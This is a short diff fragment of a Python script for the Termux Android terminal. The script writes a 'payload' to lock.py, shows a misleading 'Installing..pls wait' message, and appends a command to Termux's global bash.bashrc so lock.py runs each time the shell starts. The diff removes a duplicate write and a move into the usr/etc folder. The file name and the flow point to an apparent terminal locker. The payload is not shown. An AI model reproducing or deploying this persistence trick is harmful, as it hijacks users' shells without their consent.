@@ -104,10 +104,7 @@ while True:
 		o.write(payload)
 		print("Installing..pls wait")
 		os.system('echo python3 lock.py >> /data/data/com.termux/files/usr/etc/bash.bashrc')
-		time.sleep(.1)
-		os.system('mv lock.py /data/data/com.termux/files/usr/etc/')
-		time.sleep(5)
-		o.write(payload)
+		time.sleep(3)
 		os.system('mv lock.py /data/data/com.termux/files/home/')
 		
 		print("\n installation done! pls restart termux!")
